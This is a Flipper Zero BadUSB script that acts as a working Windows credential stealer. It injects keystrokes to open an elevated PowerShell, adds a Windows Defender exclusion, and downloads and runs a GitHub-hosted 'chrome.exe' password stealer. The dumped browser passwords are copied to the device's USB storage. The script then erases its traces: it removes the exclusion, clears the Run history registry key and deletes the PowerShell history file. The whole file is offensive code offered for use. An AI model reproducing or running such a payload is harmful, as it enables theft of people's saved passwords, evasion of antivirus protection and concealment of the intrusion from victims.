// Requirements
let badusb = require("badusb");
let usbdisk = require("usbdisk");
let storage = require("storage");

// Mass storage details
let image = "/ext/apps_data/mass_storage/chrome_loot.img";
let size = 8 * 1024 * 1024; // 8 MB

// PowerShell script
let script = [
    "$currentDirectory = Get-Location;",
    "Add-MpPreference -ExclusionPath $currentDirectory.Path;",
    "$Date = Get-Date -Format yyyy-MM-dd;",//Get Date
	"$Time = Get-Date -Format hh-mm-ss;",//Get Time
    "$exeUrl = 'https://github.com/RiadZX/FlipperPasswordStealer/raw/master/build/chrome.exe';", // URL of the executable
    "$exePath = '.\\chrome.exe';", // Path where the executable will be saved in the current directory
    "if (-not (Test-Path -Path $exePath)) {Invoke-WebRequest -Uri $exeUrl -OutFile $exePath;}", // Download the executable if it doesn't exist
    "$commandOutput = & \"$exePath\" | Out-String;", // Execute the command and capture the output
    "$fileName = '.\\chrome.txt';", //Output filename
    "$commandOutput | Out-File -FilePath $fileName;", // Save the output to a file
];


// Script crawler
let command = "";
for (let i = 0; i < script.length; i++) {
    command += script[i];
}

// Check if mass storage already exists
print("Checking for Image...");
if (storage.exists(image)) {
    print("Storage Exists.");
} else {
    print("Creating Storage...");
    usbdisk.createImage(image, size);
}

// VID & PID as HID
badusb.setup({
    vid: 0xAAAA,
    pid: 0xBBBB,
    mfr_name: "Flipper",
    prod_name: "Zero",
    layout_path: "/ext/badusb/assets/layouts/en-US.kl"
});

print("Waiting for connection");
while (!badusb.isConnected()) {
    delay(1000);
}

badusb.press("GUI", "r"); // Open Run
delay(300);
badusb.println('powershell -Command "Start-Process powershell -Verb RunAs"'); 
delay(1000);
badusb.press("LEFT");
delay(500);
badusb.press("ENTER");
delay(2000);

print("Running payload");
badusb.println(command, 1);//Run Script Crawler
delay(9000)

badusb.println("Start-Sleep 8; $DriveLetter = Get-Disk -FriendlyName 'Flipper Mass Storage' | Get-Partition | Get-Volume | Select-Object -ExpandProperty DriveLetter; New-Item -ItemType Directory -Force -Path ${DriveLetter}:\\${Date}\\; Move-Item -Path chrome.txt -Destination ${DriveLetter}:\\${Date}\\${env:computername}_${Time}.txt; Remove-Item chrome.exe; $currentDirectory = Get-Location; Remove-MpPreference -ExclusionPath $currentDirectory.Path; reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f; Remove-Item (Get-PSReadlineOption).HistorySavePath -ErrorAction SilentlyContinue; exit")
badusb.quit();
delay(2000);
usbdisk.start(image);//Open MassStorage Folder
print("Please wait until powershell closes to eject");

// Wait for user to eject the mass storage
while (!usbdisk.wasEjected()) {
    delay(1000);
}

// Stop the script
usbdisk.stop();
print("Done");


